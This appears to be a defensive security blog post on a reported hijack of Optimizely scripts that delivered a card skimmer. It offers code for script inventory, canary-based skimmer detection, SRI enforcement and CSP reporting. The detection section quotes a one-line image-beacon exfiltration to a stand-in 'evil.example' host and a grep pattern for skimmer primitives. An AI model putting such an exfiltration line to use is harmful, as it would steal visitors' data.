---
title: "Optimizely Script Hijack Hit 178 Sites and Your Third-Party JavaScript Needs Guardrails"
date: 2026-11-17
category: "thought-leadership"
tags: ["supply-chain-security", "web-security", "csp", "incident-response", "pci-dss"]
# series: ""      # optional: set the same value on every part of a multi-part series
# seriesOrder: 1   # this post's position within that series
excerpt: "Every security team has a list of things it knows it should get to. For most organizations, \"the JavaScript we load from other companies\" sits near..."
---

Every security team has a list of things it knows it should get to. For most organizations, "the JavaScript we load from other companies" sits near the top of that list and has been there for years.

This week showed what that delay can cost.

Optimizely said an attacker exploited a flaw in its Web Experimentation product and planted malicious code in some of the scripts that customer websites load from the service. Report URI, a firm that monitors the scripts websites run, says visitors to sites operated by at least 178 organizations received that code. Those organizations include CNN, the BBC, and Zoom. According to reporting on the incident, the payloads included a payment card skimmer and iOS exploit kits.

I'll stick to what has been published. I don't know the specific flaw, the exact exposure window for each customer, or which projects were affected. If you run Optimizely, get those details from Optimizely's advisory rather than from blog posts, this one included. What I can help with is the engineering: how to work out what JavaScript you actually run, how to catch a skimmer, and where SRI and CSP help or fall short.

## Why Experimentation Scripts Are a Prime Target

A compromised A/B testing or tag management script is close to the ideal delivery vehicle for an attacker. Four properties of these scripts explain why:

1. **They run as first-party code.** A `<script src>` from a vendor gets the same privileges as your own code. It can read the DOM, hook form fields, read non-HttpOnly cookies, and make network requests.
2. **They load early and often synchronously.** Experimentation snippets usually sit high in the `<head>` to prevent page flicker. They execute before most of your own code.
3. **Their job is to change your page.** A script that rewrites DOM elements is normal behavior for an experimentation tool. That makes malicious DOM changes harder to spot.
4. **They change all the time.** Every time a marketer publishes an experiment, the delivered script typically changes. This is exactly what makes Subresource Integrity (SRI) hard to apply. More on that below.

One compromise at the vendor reaches every customer that loads the script. Because the code comes from a domain you already trust, your WAF won't see it, your SAST pipeline won't see it, and your dependency scanner won't see it.

## First 24 Hours: If You Load Optimizely Today

Before the longer-term engineering work, here's the triage list I'd hand my team this morning:

- **Read the vendor advisory and confirm scope.** Find out whether your projects were affected and what the exposure window was. Don't assume you were or weren't.
- **Find every page that loads the snippet.** Pay special attention to checkout, login, account settings, and anything that collects PII. The inventory script below helps.
- **Pull your CSP violation reports and edge logs** for the relevant window. Look for unfamiliar `connect-src`, `img-src`, or `script-src` destinations.
- **Ask whether payment data was ever in the DOM** of a page running the script. If you use PSP-hosted iframes for card fields, a script in the parent page generally can't read them. If card fields are native inputs on your page, involve your PSP and your PCI QSA early.
- **Treat the iOS exploit component as an endpoint issue too.** Your employees visit these sites. Make sure your managed iOS fleet is current and check your MDM compliance reports.
- **Decide whether to remove the snippet from sensitive pages now.** You can make that call today without waiting for the vendor's full root-cause analysis.

Now the durable work.

## Step 1: Build a Real Inventory of What Executes

Your CMS config and tag manager don't tell you what runs in the browser. Scripts load other scripts. The only reliable inventory comes from loading the page in a real browser and recording what happens.

The Playwright script below crawls a list of URLs, captures every script response (including ones injected dynamically), hashes the contents, and fingerprints inline scripts:

```javascript
// script-inventory.mjs
// Usage: node script-inventory.mjs urls.txt > inventory.json
import { chromium } from 'playwright';
import crypto from 'node:crypto';
import fs from 'node:fs';

const urls = fs.readFileSync(process.argv[2], 'utf8')
  .split('\n').map(s => s.trim()).filter(Boolean);

const sha384 = buf => crypto.createHash('sha384').update(buf).digest('base64');

const browser = await chromium.launch();
const inventory = [];

for (const pageUrl of urls) {
  const context = await browser.newContext({
    // Use a realistic UA; some skimmers stay dormant for obvious bots
    userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
  });
  const page = await context.newPage();
  const pending = [];

  page.on('response', res => {
    const req = res.request();
    if (req.resourceType() !== 'script') return;
    pending.push((async () => {
      try {
        const body = await res.body();
        inventory.push({
          page: pageUrl,
          type: 'external',
          src: req.url(),
          host: new URL(req.url()).host,
          initiator: req.frame()?.url() ?? null,
          status: res.status(),
          bytes: body.length,
          sha384: sha384(body),
        });
      } catch { /* redirects, aborted loads */ }
    })());
  });

  await page.goto(pageUrl, { waitUntil: 'networkidle', timeout: 60_000 });
  await page.waitForTimeout(5_000); // let lazy/deferred tags fire
  await Promise.all(pending);

  const inline = await page.$$eval('script:not([src])', els =>
    els.map(e => e.textContent || ''));
  for (const code of inline) {
    inventory.push({
      page: pageUrl,
      type: 'inline',
      bytes: code.length,
      sha384: sha384(Buffer.from(code)),
      preview: code.slice(0, 120),
    });
  }
  await context.close();
}

await browser.close();
console.log(JSON.stringify(inventory, null, 2));
```

Run it against your highest-risk pages: checkout, login, password reset, account profile. Commit the output as a baseline. On a schedule (I like every 15 minutes for checkout and hourly for everything else), run it again and diff:

```bash
#!/usr/bin/env bash
# diff-inventory.sh baseline.json current.json
set -euo pipefail

extract() {
  jq -r '.[] | select(.type=="external") | "\(.page)\t\(.host)\t\(.src | split("?")[0])\t\(.sha384)"' "$1" | sort -u
}

NEW_HOSTS=$(comm -13 \
  <(jq -r '.[] | select(.host) | "\(.page)\t\(.host)"' "$1" | sort -u) \
  <(jq -r '.[] | select(.host) | "\(.page)\t\(.host)"' "$2" | sort -u))

CHANGED=$(comm -13 <(extract "$1") <(extract "$2"))

if [[ -n "$NEW_HOSTS" ]]; then
  echo "::error:: New script hosts detected:"
  echo "$NEW_HOSTS"
  exit 2
fi

if [[ -n "$CHANGED" ]]; then
  echo "::warning:: Script content changed:"
  echo "$CHANGED"
  exit 1
fi
```

Treat the two signals differently:

- **A new script host on checkout** should page someone. That's almost never a legitimate change nobody told you about.
- **A changed hash on a vendor script** is expected for dynamic snippets like experimentation tools. Don't page on it. Do retain each version so you have something to diff during an incident. Store the bodies, not just the hashes.

## Step 2: Detect Skimmers Behaviorally, Not Just by Signature

Skimmer code is usually obfuscated, often loaded in stages, and frequently conditional. It may activate only on URLs containing `checkout`, only once per visitor, or only when it doesn't detect DevTools. Signature scanning catches lazy attackers. Behavioral testing catches more of the rest.

The technique I trust most is a **canary transaction**. Fill your payment form with a known test value, then watch every outbound request for that value in any common encoding. If it shows up anywhere other than your PSP, you have a problem.

```javascript
// canary-checkout.mjs
import { chromium } from 'playwright';

const CHECKOUT_URL = process.env.CHECKOUT_URL;
const ALLOWED_HOSTS = new Set([
  'api.your-psp.example',
  'js.your-psp.example',
  new URL(CHECKOUT_URL).host,
]);

// Distinctive, non-production values. Use your PSP's documented test card.
const CANARY = {
  pan: '4111111111111111',
  name: 'ZZCANARY QXWV',
  email: 'canary-7f3a9c@your-domain.example',
};

function encodings(value) {
  const b64 = Buffer.from(value).toString('base64');
  return [
    value,
    encodeURIComponent(value),
    b64,
    b64.replace(/=+$/, ''),
    Buffer.from(value).toString('hex'),
    [...value].reverse().join(''),
  ];
}

const needles = Object.values(CANARY).flatMap(encodings);
const findings = [];

function inspect(channel, url, payload) {
  const host = new URL(url).host;
  const haystack = `${url}\n${payload ?? ''}`;
  for (const n of needles) {
    if (haystack.includes(n) && !ALLOWED_HOSTS.has(host)) {
      findings.push({ channel, host, url, needle: n.slice(0, 12) + '…' });
    }
  }
}

const browser = await chromium.launch();
const page = await browser.newPage();

page.on('request', req => inspect('http', req.url(), req.postData()));
page.on('websocket', ws => {
  ws.on('framesent', f => inspect('websocket', ws.url(), String(f.payload)));
});

await page.goto(CHECKOUT_URL, { waitUntil: 'networkidle' });

// Adjust selectors to your form. If card fields are PSP iframes, also
// test the non-card fields; skimmers increasingly target PII and creds.
await page.fill('#name', CANARY.name);
await page.fill('#email', CANARY.email);
const pan = page.locator('#card-number');
if (await pan.count()) {
  await pan.pressSequentially(CANARY.pan, { delay: 40 }); // fires keystroke listeners
}
await page.locator('#email').blur();
await page.waitForTimeout(8_000); // many skimmers batch or delay exfil

await browser.close();

if (findings.length) {
  console.error(JSON.stringify(findings, null, 2));
  process.exit(2);
}
console.log('No canary leakage detected');
```

A few lessons from running this kind of test in production:

- **Type, don't paste.** Many skimmers attach `keyup` or `input` listeners. `fill()` may not trigger the same event sequence a human does.
- **Wait longer than feels necessary.** Exfiltration is often deferred to `beforeunload`, batched on a timer, or sent through `navigator.sendBeacon`. Playwright's `request` event captures beacons.
- **Watch image requests.** The oldest trick still works: `new Image().src = 'https://evil.example/p.gif?d=' + btoa(data)`. The URL inspection above covers it.
- **Accept the limits.** Synthetic tests run from your infrastructure, with your IP ranges, at predictable intervals. Attackers know that. Use synthetic testing as one layer, alongside real-user telemetry from CSP reporting, which we'll get to.

For a cheap static pass over stored script versions, a grep for suspicious primitives works well as a triage filter:

```bash
# Run against archived script bodies from your inventory job
grep -lE "addEventListener\(['\"](keyup|input|change|submit)['\"]|sendBeacon|new Image\(\)|atob\(|String\.fromCharCode\(|\\\\x[0-9a-f]{2}.{0,4}\\\\x[0-9a-f]{2}" archive/*.js
```

This will flag plenty of legitimate analytics code. Use it to rank scripts for human review. Don't use it as an alert.

## Step 3: SRI, Where It Works and Where It Doesn't

Subresource Integrity tells the browser to refuse a script unless its contents match a hash you specify:

```bash
# Generate an SRI hash for a pinned, versioned asset
curl -sSL https://cdn.example.com/widget@3.4.1/widget.min.js \
  | openssl dgst -sha384 -binary | openssl base64 -A
```

```html
<script
  src="https://cdn.example.com/widget@3.4.1/widget.min.js"
  integrity="sha384-<paste-hash-here>"
  crossorigin="anonymous"></script>
```

If an attacker modifies that file, the browser won't run it. For static, versioned libraries from public CDNs, SRI is close to free and you should use it everywhere.

**SRI does not solve the Optimizely problem.** Experimentation and tag manager snippets are dynamic by design. Their contents change whenever someone publishes an experiment or edits a tag. If you pin a hash, the next marketing change breaks the script, and it breaks on whatever page loads it first. Teams that try this either give up or remove the integrity attribute "temporarily," and it never comes back.

For dynamic vendor scripts, you have three honest options:

1. **Self-host a reviewed snapshot.** Pull the vendor script in your build pipeline, diff it against the previous version, require approval on meaningful changes, and serve it from your own origin with SRI. This adds latency to marketing changes. For checkout pages, that tradeoff is worth it.
2. **Keep it off sensitive pages entirely.** Most of the value of experimentation comes from landing and product pages. Very little of it comes from the payment step.
3. **Accept that you can't verify integrity, and contain it.** That's what CSP is for.

To keep SRI from eroding over time, enforce it in CI. This check fails the build if any external script in your rendered HTML lacks an `integrity` attribute, unless it's on an explicit, reviewed exception list:

```python
# ci/check_sri.py
import sys, pathlib
from html.parser import HTMLParser

EXCEPTIONS = {
    # Dynamic vendor snippets: reviewed, owner-assigned, NOT on checkout
    "cdn.optimizely.com",
}

class ScriptCheck(HTMLParser):
    def __init__(self):
        super().__init__()
        self.violations = []
    def handle_starttag(self, tag, attrs):
        if tag != "script":
            return
        a = dict(attrs)
        src = a.get("src", "")
        if src.startswith(("https://", "//")):
            host = src.split("/")[2]
            if "integrity" not in a and host not in EXCEPTIONS:
                self.violations.append(src)

failed = False
for path in pathlib.Path(sys.argv[1]).rglob("*.html"):
    p = ScriptCheck()
    p.feed(path.read_text(errors="ignore"))
    for v in p.violations:
        print(f"{path}: external script without SRI: {v}")
        failed = True
    if "checkout" in str(path) and any(h in path.read_text() for h in EXCEPTIONS):
        print(f"{path}: excepted dynamic vendor script present on checkout")
        failed = True

sys.exit(1 if failed else 0)
```

Confirm the actual hostnames your snippet loads from in your own inventory. Don't copy mine.

## Step 4: CSP Limits What a Compromised Script Can Do

Many teams think of CSP mainly as a defense against script injection. In a supply chain compromise, its more valuable job is **restricting where data can go**. If a trusted script turns malicious, a tight `connect-src`, `img-src`, and `form-action` can be the difference between a skimmer that runs and a skimmer that runs but can't send anything out.

Here's a policy shape for a payment page that uses PSP-hosted fields:

```nginx
# nginx: checkout location, enforced policy
location /checkout {
    # Nonce is generated per-request by the app and injected into
    # <script nonce="..."> tags; the app sets this header itself in practice.
    add_header Content-Security-Policy "
        default-src 'none';
        script-src 'self' 'nonce-$request_id' https://js.your-psp.example;
        connect-src 'self' https://api.your-psp.example;
        frame-src https://js.your-psp.example;
        img-src 'self' data:;
        style-src 'self';
        font-src 'self';
        form-action 'self';
        base-uri 'none';
        frame-ancestors 'none';
        object-src 'none';
        report-uri https://csp.your-domain.example/report;
        report-to csp" always;

    add_header Reporting-Endpoints 'csp="https://csp.your-domain.example/report"' always;
    proxy_pass http://app_upstream;
}
```

(Line breaks are for readability. Collapse the policy to a single line in real config. Using `$request_id` as a nonce only works if your app renders the same value into its script tags. In most stacks, the app should generate the nonce and set the header itself.)

Some hard-won notes:

- **Be careful with `'strict-dynamic'`.** It lets any nonced script load further scripts and passes trust along to them. That's great for managing tag sprawl. It also means that if a trusted loader is compromised, everything it loads is trusted too. On checkout, I prefer explicit host allowlists.
- **Allowlisted analytics domains are exfiltration channels.** If `connect-src` includes a general analytics collector, a skimmer can encode stolen data into analytics hits sent to an account the attacker controls. Keep payment-page `connect-src` as short as you can.
- **Roll out in report-only mode first.** Ship `Content-Security-Policy-Report-Only` for a week or two, fix the noise, then enforce. Skipping this step is how CSP projects get rolled back.
- **Separate policies by page sensitivity.** Marketing pages can have a looser policy that allows the experimentation tool. Checkout gets the strict one. That's much easier if checkout lives on its own subdomain or path prefix.

## Step 5: Turn CSP Reports Into Detection

CSP reports are real-user monitoring you get for free. Every browser that hits a violation tells you about it, including browsers that a geo-targeted, bot-evading skimmer chose to attack. This is how firms like Report URI were able to see this campaign at all.

A minimal collector that handles both the legacy and modern report formats, and flags new destinations:

```python
# csp_collector.py  (Flask; put behind your normal ingress + rate limiting)
from flask import Flask, request
import json, logging, redis

app = Flask(__name__)
r = redis.Redis()
log = logging.getLogger("csp")

def normalize(report):
    # Legacy: {"csp-report": {...}}  Modern: [{"type":"csp-violation","body":{...}}]
    body = report.get("csp-report") or report.get("body") or {}
    return {
        "page": body.get("document-uri") or body.get("documentURL"),
        "directive": body.get("effective-directive") or body.get("effectiveDirective"),
        "blocked": body.get("blocked-uri") or body.get("blockedURL"),
        "source": body.get("source-file") or body.get("sourceFile"),
    }

@app.post("/report")
def report():
    payload = request.get_json(force=True, silent=True) or {}
    reports = payload if isinstance(payload, list) else [payload]
    for raw in reports:
        v = normalize(raw)
        key = f"{v['directive']}|{(v['blocked'] or '').split('?')[0]}"
        # First sighting of a directive+destination pair is the signal
        if r.sadd("csp:seen", key):
            log.warning("NEW CSP VIOLATION %s", json.dumps(v))
            # hook: send to SIEM / page on-call if page is checkout
        r.hincrby("csp:counts", key, 1)
    return "", 204
```

The alert logic that matters: **a new `connect-src` or `img-src` destination appearing on a sensitive page, especially with a `source-file` that points at a third-party script.** That pattern means a vendor script tried to send data somewhere you never authorized. A burst of those across many users at once is about as clear an early warning of skimming as you'll get.

## Step 6: Governance That Survives the Next Incident

The engineering controls above will decay unless someone owns them. Here's what has worked for me:

- **Every third-party script has a named internal owner** and a documented business purpose. No owner means the script gets removed.
- **Payment pages get a separate approval path.** If you're in PCI scope, PCI DSS v4.0 requirements 6.4.3 (inventory, authorization, and integrity of payment page scripts) and 11.6.1 (detecting unauthorized changes to payment pages) already require this. The inventory and diffing jobs above are a solid start toward evidence for both. Confirm the specifics with your QSA.
- **Vendor contracts should cover script compromise.** Ask vendors how they protect their publishing pipeline, how fast they'll notify you, and whether they support pinned or self-hosted delivery.
- **Rehearse removal.** Can you pull a vendor script from every page in under 15 minutes without a deploy? If the answer involves a ticket to marketing ops, fix that before you need it.

## Key Takeaways

- **Vendor scripts run with your site's privileges.** A compromise at the vendor is effectively a compromise of your site, for every visitor, until you act.
- **Inventory from the browser, not from config.** Crawl sensitive pages on a schedule, hash what executes, and alert on new hosts.
- **Test for skimming behaviorally.** Canary transactions combined with network inspection catch what signatures miss.
- **Use SRI wherever content is static,** and enforce it in CI. Don't pretend it works for dynamic snippets. For those, self-host a reviewed copy or keep them off sensitive pages.
- **Use CSP mainly to restrict where data can go.** A tight `connect-src` on checkout can turn a working skimmer into a failed one.
- **Wire CSP reports into detection.** Real users' browsers are the best sensor network you have.
- **For this specific incident,** confirm your exposure, scope, and timeline in Optimizely's advisory, and pull your logs and CSP reports for that window now, before retention runs out.

The organizations hit this week didn't do anything unusual. They loaded a popular script from a reputable vendor, as most of us do. The difference between an embarrassing headline and a breach notification often comes down to whether that script was allowed on the payment page and whether it could send data anywhere it wanted. Both are under your control today.

## Sources

- [Hijacked Optimizely Scripts Served Card Skimmer and iOS Exploit Kits to CNN, BBC and Zoom Visitors](https://thehackernews.com/2026/11/hijacked-optimizely-scripts-served-card.html) (2026-11-17)
